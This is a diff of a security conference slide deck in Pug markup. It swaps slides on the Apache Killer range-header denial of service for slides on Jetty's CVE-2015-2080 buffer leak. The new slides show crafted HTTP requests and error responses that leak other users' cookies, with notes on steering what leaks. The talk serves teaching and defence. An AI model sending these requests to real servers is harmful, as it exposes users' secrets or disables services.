@@ -460,10 +460,15 @@ html
         h2 Reported?
 
       section(data-bespoke-state='solution-slide')
-        h2.full-slide Best Practices Matter
+        h2.full-slide
+          | Value
+          br 
+          | Best
+          br
+          | Practices
 
       section(data-bespoke-state='topic-slide')
-        h2.full-slide Apache
+        h2.full-slide Jetty
         ul.stack.corner
           li.lowlight Your Code
           li.lowlight Web Framework
@@ -471,75 +476,139 @@ html
           li Web Server
           li.lowlight Database
           li.lowlight Network Transport
-
-      section
-        h2 HTTP Range Headers
-        pre
-          code.language-bash.
-            GET /video.mp4 HTTP/1.1
-            Range: bytes=0-100
-
-            HTTP/1.1 206 Partial Content
-            Content-Type: video/mp4
-            Content-Length: 101
-            Accept-Ranges: bytes
-            Content-Range: bytes 0-100/123456
-
-            &#65533;&#65533;&#65533;123&#65533;asdasd&#65533;89&#65533;2&#65533;b&#65533;B%99D[...]
-
-      section
-        h2 HTTP Range Headers
-        pre(style='padding: 10px 20px !important')
-          code.language-bash.
-            GET /video.mp4 HTTP/1.1
-            Range: bytes=0-100,200-300
-
-            HTTP/1.1 206 Partial Content
-            Content-Type: multipart/byteranges; boundary=qwe123
-            Content-Length: 330
-            Accept-Ranges: bytes
-            
-            --qwe123
-            Content-Type: video/mp4
-            Content-Range: bytes 0-100/123456
-            
-            &#65533;&#65533;&#65533;123&#65533;asdasd&#65533;89&#65533;2&#65533;b&#65533;B%99D[...]
-            --qwe123
-            Content-Type: video/mp4
-            Content-Range: bytes 200-300/123456
-
-            &#65533;&#65533;&#65533;&#65533;9d0cd&#65533;FFFFF?!FFFF&#65533;&#65533;&#65533;"X[...]
-        aside
-
-      section
-        h2 Apache
-        h4 Apache Killer (CVE-2011-3192)
-
-        pre
-          code.language-bash.
-            HEAD /video.mp4 HTTP/1.1
-            Range: bytes=0-,0-1,0-2,0-3,0-4,0-5,0-6,0-7,0-8,0-9,
-              0-10,0-11,0-12,0-13,0-14,0-10,0-16,0-17,0-18,[...]
-              0-1294,0-1295,0-1296,0-1297,0-1298,0-1299
-            Accept-Encoding: gzip
-
-            ...
         aside
           ul
-            li Request many overlapping ranges
-            li 8KB per header: 1299 ranges
-            li Expensive on IIS
-            li + large TCP window, to extend the damage
-            li Apache implementation creates n^2 buckets to hold per-range data, not n
-            li GZIP is not required, but adds extra hurt too
-            li Uses all the CPU and memory of a server fairly quickly
-            li Your code: watch out for non-linear unbounded complexity from user input
+            li We're all using a web server, Apache, Tomcat, Jetty, IIS
+            li Jetty particularly is growing rapidly in the modern Java community            
+            li Like Nancy in the C# world
+
+      section
+        h2 HTTP
+        pre
+          code.language-bash.
+            GET / HTTP/1.1
+            Host: localhost:8080
+            Accept: text/html
+            Cookie: password=secret
+
+        aside
+          ul
+            li This is a simple HTTP request Jetty might receive
+            li Has a series of headers with keys and values
+            li Some of which contain secrets, typically the cookies particularly
+            li Potentially also the request body too though, containing valuables
+
+      section
+        h2 Bad HTTP
+        pre
+          code.language-bash.
+            GET / HTTP/1.1
+            Host: localhost:8080
+            Accept&#174;: text/html
+
+        aside
+          ul
+            li This is an invalid HTTP request
+            li &169; is binary 169, and that's not a legal character in an HTTP header name
+            li Jetty follows the RFCs for this and (like most web servers) rejects this request.
+
+      section
+        h2 Bad HTTP
+        pre
+          code.language-bash.
+            HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
+               'GET / HTTP/1.1
+                H...t:8080
+                Accept\xC2<<<\xAe: text/html
+
+                >>>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
+                \x00\x00\x00\x00\x00...\x00\x00\x00\x00\x00\x00\x00
+                \x00\x00\x00\x00\x00\x00\x00\x00'
+            Content-Length: 0
+            Connection: close
+            Server: Jetty(9.2.8.v20150217)
+        aside
+          ul
+            li In that case, with the version of Jetty released in February, we get a response like this.
+            li Error message containing the request content and highlighting the bad character
+            li There's an issue with this though
+            li What're those zeros?
+            li They're the rest of the contents of the buffer
+            li This is printed by a general purpose 'toDebugString(buffer)' method
+            li Prints the content in a buffer, highlighting a part, and providing context
+            li This sounds fine, just messy, but is actually a huge disaster: these buffers are reused by all requests
+            li If the previous request was longer than this one, we can read a chunk of data out of it
+            li Can change which data by progressively increasing how far down our request the bad character comes
+
+
+
+      section
+        h2 CVE-2015-2080
+        div.sideBySide
+          pre(style='align-self: flex-start;')
+            code.language-bash.
+              GET / HTTP/1.1
+              Host: localhost:8080
+              Accept: text/html
+              Cookie: password=secret
+          pre
+            code.language-bash.
+              GET / HTTP/1.1
+              Host: localhost:8080
+              Accept®: text/html
+
+
+              HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
+               'GET / HTTP/1.1
+                H...t:8080
+                Accept\xC2<<<\xAe: text/html
+
+                >>>ie: password=secr...\x00\x00\x00\x00\x00
+                \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+              Content-Length: 0
+              Connection: close
+              Server: Jetty(9.2.8.v20150217)
+        aside
+          ul
+            li We can use this to see bits of other people's requests
+
+      section
+        h2 CVE-2015-2080
+        div.sideBySide
+          pre(style='align-self: flex-start;')
+            code.language-bash.
+              GET / HTTP/1.1
+              Host: localhost:8080
+              Accept: text/html
+              Cookie: password=secret
+          pre
+            code.language-bash.
+              GET / HTTP/1.1
+              Host: localhost:8080
+              Accept®: text/htmlQQQQ
+
+
+              HTTP/1.1 400 Illegal character 0xc2 in state=HEADER_IN_NAME in 
+               'GET / HTTP/1.1
+                H...t:8080
+                Accept\xC2<<<\xAe: text/htmlQQQQ
+
+                >>>password=secret...\x00\x00\x00\x00\x00
+                \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
+              Content-Length: 0
+              Connection: close
+              Server: Jetty(9.2.8.v20150217)
+        aside
+          ul
+            li And with minor fiddling, we can find the relevant bit of request we're looking for
 
       section(data-bespoke-state='solution-slide')
         h2.full-slide
-          | Features
+          | Keep
           br
-          | Add Risk
+          | Errors
+          br
+          | Secret
 
       section(data-bespoke-state='topic-slide')
         h2.full-slide PostgreSQL
@@ -647,7 +716,7 @@ html
         ul.conclusions
           li Be ready to update
           li Fear user input
-          li Best practices matter
+          li Value Best Practices
           li Features add risk
           li Isolate your infrastructure
         aside
